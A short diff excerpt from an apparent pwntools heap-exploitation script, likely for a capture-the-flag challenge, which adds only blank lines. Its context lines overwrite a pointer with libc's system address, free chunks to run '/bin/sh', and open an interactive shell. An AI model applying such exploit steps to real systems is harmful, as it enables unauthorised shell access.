@@ -200,4 +200,6 @@ addPixal("15", "8", str(len(pwn.p64(libc_base + libc.symbols["system"])) + 1), p
 #now we free 15, 2 since the pixal heap addr has "/bin/sh" from the addPixal above
 removePixal("15", "2")
 
+
+
 io.interactive()
